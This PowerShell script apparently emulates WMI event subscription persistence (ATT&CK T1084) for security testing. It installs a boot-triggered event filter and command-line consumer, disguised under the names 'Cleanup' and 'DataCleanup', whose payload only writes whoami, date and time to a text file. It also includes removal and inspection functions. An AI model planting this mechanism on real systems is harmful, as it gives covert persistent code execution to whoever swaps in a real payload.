function Install-Persistence{

    $EventFilterName = 'Cleanup'
    $EventConsumerName = 'DataCleanup'
    $finalPayload = ""c:\windows\system32\cmd.exe /c echo T1084 > C:\t1084.txt && c:\windows\system32\cmd.exe /c whoami >> C:\t1084.txt && c:\windows\system32\cmd.exe /c date /t >> C:\t1084.txt && c:\windows\system32\cmd.exe /c time /t >> C:\t1084.txt"

    # Create event filter
    $EventFilterArgs = @{
        EventNamespace = 'root/cimv2'
        Name = $EventFilterName
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 30 AND TargetInstance.SystemUpTime < 325"
        QueryLanguage = 'WQL'
    }

    $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

    # Create CommandLineEventConsumer
    $CommandLineConsumerArgs = @{
        Name = $EventConsumerName
        CommandLineTemplate = $finalPayload
    }
    $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

    # Create FilterToConsumerBinding
    $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }
    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs

    #Confirm the Event Filter was created
    $EventCheck = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
    if ($EventCheck -ne $null) {
        Write-Host "Event Filter $EventFilterName successfully written to host"
    }

    #Confirm the Event Consumer was created
    $ConsumerCheck = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
    if ($ConsumerCheck -ne $null) {
        Write-Host "Event Consumer $EventConsumerName successfully written to host"
    }

    #Confirm the FiltertoConsumer was created
    $BindingCheck = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__eventfilter.name='$EventFilterName'"""
    if ($BindingCheck -ne $null){
        Write-Host "Filter To Consumer Binding successfully written to host"
    }

}

function Remove-Persistence{
    $EventFilterName = 'Cleanup'
    $EventConsumerName = 'DataCleanup'

    # Clean up Code - Comment this code out when you are installing persistence otherwise it will

    $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
    $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
    $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"

    $FilterConsumerBindingToCleanup | Remove-WmiObject
    $EventConsumerToCleanup | Remove-WmiObject
    $EventFilterToCleanup | Remove-WmiObject

}

function Check-WMI{
    Write-Host "Showing All Root Event Filters"
    Get-WmiObject -Namespace root/subscription -Class __EventFilter

    Write-Host "Showing All CommandLine Event Consumers"
    Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer

    Write-Host "Showing All Filter to Consumer Bindings"
    Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
}
